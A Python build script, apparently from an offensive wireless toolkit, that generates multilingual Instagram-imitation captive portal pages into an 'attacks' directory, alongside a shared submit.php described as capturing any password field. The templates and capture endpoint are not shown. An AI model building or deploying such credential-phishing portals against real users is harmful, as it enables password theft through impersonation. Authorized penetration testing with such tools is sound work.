#!/usr/bin/env python3
"""Build the Instagram captive portals from a single set of templates.

Usage:
    scripts/build_instagram_portals.py            # write the portals
    scripts/build_instagram_portals.py --check    # exit 1 if they are stale

Adding a language means one entry in ``scripts/instagram_portal/languages.json``;
adding or changing the markup means editing the templates and re-running this
script. The shared generator lives in ``scripts/portal_builder.py``.
"""

from __future__ import annotations

import argparse

from portal_builder import REPO_DIR, run_family

SOURCE_DIR = REPO_DIR / "scripts" / "instagram_portal"
SITES_DIR = REPO_DIR / "attacks" / "Captive Portal" / "sites"

# Rendered per language.
TEMPLATES = ("index.html", "error.html", "final.html")
# Copied unchanged into every portal directory. The submission endpoint is
# shared with the WiFi portals because it captures any password field.
STATIC_FILES = {"submit.php": SOURCE_DIR / "submit.php"}


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--check",
        action="store_true",
        help="do not write anything; fail if the committed portals differ",
    )
    args = parser.parse_args()

    return run_family(
        label="Instagram",
        source_dir=SOURCE_DIR,
        sites_dir=SITES_DIR,
        prefix="Instagram",
        templates=TEMPLATES,
        static_files=STATIC_FILES,
        check=args.check,
    )


if __name__ == "__main__":
    raise SystemExit(main())
